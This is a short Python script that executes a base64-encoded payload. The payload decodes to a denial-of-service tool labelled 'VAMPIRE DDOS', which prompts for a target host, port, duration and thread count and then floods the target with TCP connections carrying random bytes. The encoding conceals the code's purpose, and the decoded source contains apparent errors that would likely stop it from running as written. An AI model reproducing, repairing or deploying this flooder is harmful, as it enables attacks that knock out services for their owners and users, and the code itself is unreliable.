import base64
exec(base64.b64decode(b'aW1wb3J0IHRocmVhZGluZywgcmFuZG9tLCBzb2NrZXQsIHRpbWUKCmRlZiBiYW5uZXIoKToKICAgIHByaW50KCJcblwiICsgIj0iKjUwKQogICAgcHJpbnQoIiAgICAgVkFNUElSRSBERE9TIC0gQkFTSUMgVVNFUiBNT0RFCiAgICAgIFR5cGU6IEhUVFAgU29ja2V0IEZsb29kaW5nIikKICAgIHByaW50KCI9IiowNSsiXG4iKQoKZGVmIGF0dGFjayh0YXJnZXQsIHBvcnQsIGR1cmF0aW9uKToKICAgIHRpbWVvdXQgPSB0aW1lLnRpbWUoKSArIGR1cmF0aW9uCiAgICBwcmludChmIlshXSBBdHRhY2sgU3RhcnRlZCBvbiB7dGFyZ2V0fTp7cG9ydH0gZm9yIHtkdXJhdGlvbn0gc2Vjb25kcy4uLlxuIikKICAgIHdoaWxlIHRpbWUudGltZSgpIDwgdGltZW91dDoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHMuY29ubmVjdCgodGFyZ2V0LCBwb3J0KSkKICAgICAgICAgICAgcy5zZW5kKHJhbmRvbS5fdXJhbmRvbSgxMDI0KSkKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgc3RhcnRfZGRvcygpOgogICAgYmFubmVyKCkKICAgIHRhcmdldCA9IGlucHV0KCIrIFt+XSBUYXJnZXQgSVAvRG9tYWluOiAiKS5zdHJpcCgpCiAgICBwb3J0ID0gaW50KGlucHV0KCIrIFt+XSBQb3J0ICg4MCByZWNvbW1lbmRlZCk6ICIpLnN0cmlwKCkpCiAgICBkdXJhdGlvbiA9IGludChpbnB1dCgiKyBbfl0gQXR0YWNrIER1cmF0aW9uIChpbiBzZWNvbmRzKTogIikuc3RyaXAoKSkKICAgIHRocmVhZHMgPSBpbnQoZGljdCgpKQogICAgdHJ5OgogICAgICAgIHRocmVhZHMgPSBpbnQoaW5wdXQoIisiIFt+XSBUaHJlYWRzIChlLmcuIDUwKTogIikpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcyAKCiAgICBwcmludChcIlxuW10gSW5pdGlhbGl6aW5nIGF0dGFjay4uLlwiKQogICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9YXR0YWNrLCBhcmdzPSh0YXJnZXQsIHBvcnQsIGR1cmF0aW9uKSkKICAgICAgICB0aHJlYWQuc3RhcnQoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHRyeToKICAgICAgICBzdGFydF9kZG9zKCkKICAgIGV4Y2VwdDoKICAgICAgICBwcmludChcIlxuWyFdIEF0dGFjayBzdG9wcGVkIGJ5IHVzZXIuXCIp
'))
